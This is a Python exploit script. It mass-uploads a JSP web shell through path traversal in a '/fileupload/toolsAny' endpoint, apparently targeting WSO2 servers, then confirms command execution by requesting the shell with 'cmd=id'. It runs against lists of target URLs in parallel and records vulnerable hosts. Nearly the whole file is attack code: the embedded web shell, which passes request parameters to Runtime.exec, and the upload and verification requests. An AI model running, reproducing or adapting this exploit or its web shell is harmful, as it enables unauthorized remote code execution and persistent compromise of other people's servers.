import sys
import requests
import optparse
import multiprocessing
import re
from requests.packages import urllib3
from requests.exceptions import MissingSchema, InvalidURL

urllib3.disable_warnings()

requestEngine = multiprocessing.Manager()

session = requests.Session()
global paramResults
paramResults = requestEngine.list()

globals().update(locals())

def spiderXpl(url):
    globals().update(locals())
    if not url.startswith('http'):
        url='http://'+url
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
               "Connection": "close",
               "Accept-Encoding": "gzip, deflate"}

    shell = """<FORM>
	    <INPUT name='cmd' type=text>
	    <INPUT type=submit value='Run'>
	</FORM>
	<%@ page import="java.io.*" %>
	    <%
	    String cmd = request.getParameter("cmd");
	    String output = "";
	    if(cmd != null) {
	        String s = null;
	        try {
	            Process p = Runtime.getRuntime().exec(cmd,null,null);
	            BufferedReader sI = new BufferedReader(new
	InputStreamReader(p.getInputStream()));
	            while((s = sI.readLine()) != null) { output += s+"</br>"; }
	        }  catch(IOException e) {   e.printStackTrace();   }
	    }
	%>
	        <pre><%=output %></pre>"""
            
    rurl2 = str(url) + '/fileupload/toolsAny'
    files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/megas.jsp": shell}
    try:
        requests.post(url = rurl2, headers=headers,files=files,verify=False)
        get_shell(url)
    except UnboundLocalError:
        pass
    except KeyboardInterrupt:
        exit(0)

def get_shell(url):
    try:
        webshell = str(url)+ "/authenticationendpoint/megas.jsp?cmd=id"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate"}

        rawResp = session.get(url=webshell,headers=headers,allow_redirects=False, verify=False,timeout=5)
        
        raw_wmu = rawResp.text.replace(',','\n')
        rawid = re.findall('uid=.*$',raw_wmu,re.MULTILINE)
        rawvalue = str(rawid).replace('[\'', '')

        if rawvalue.startswith('uid'):
            paramResults.append(url + ':' + str(url))
            print('[!] Application Vulnerable URL: '+ url)
            print('[!] Command id result: '+ str(rawid))

    except requests.exceptions.ConnectionError:
        print('[x] Failed to Connect: '+url)
        pass
    except KeyboardInterrupt:
        print('[!] Stoping spidering...')
        exit(0)
    except (MissingSchema, InvalidURL):
        pass


def main():
    globals().update(locals())
    #params()
    
    sys.setrecursionlimit(100000)

    if not sys.stdin.isatty():
        urls = sys.stdin.read()
    else:
        f = open(optionsOpt.filehosts)
        urls = map(str.strip, f.readlines())

    multiReq = multiprocessing.Pool(optionsOpt.threads)

    try:
        multiReq.map(spiderXpl, urls)
        multiReq.close()
        multiReq.join()
    except UnboundLocalError:
        pass
    except KeyboardInterrupt:
        exit(0)

    if optionsOpt.output:
        print("\n[!] Saving the output result in: %s" % optionsOpt.output)

        with open(optionsOpt.output, "w") as f:
            for result in paramResults:
                f.write("%s\n" % result)
        f.close()

if __name__ == "__main__":
    parser = optparse.OptionParser()

    parser.add_option('-u', '--url', action="store", dest="url", help='Base target uri (ex. http://target-uri/)')
    parser.add_option('-f', '--filehosts', dest="filehosts", help='example.txt')
    parser.add_option('-t', '--threads', dest="threads", type=int,default=10)
    parser.add_option('-m', '--maxtimeout', dest="timeout", type=int,default=8)
    parser.add_option('-o', '--output', dest="output", type=str,default='cookies.txt')
    optionsOpt, args = parser.parse_args()

    main()
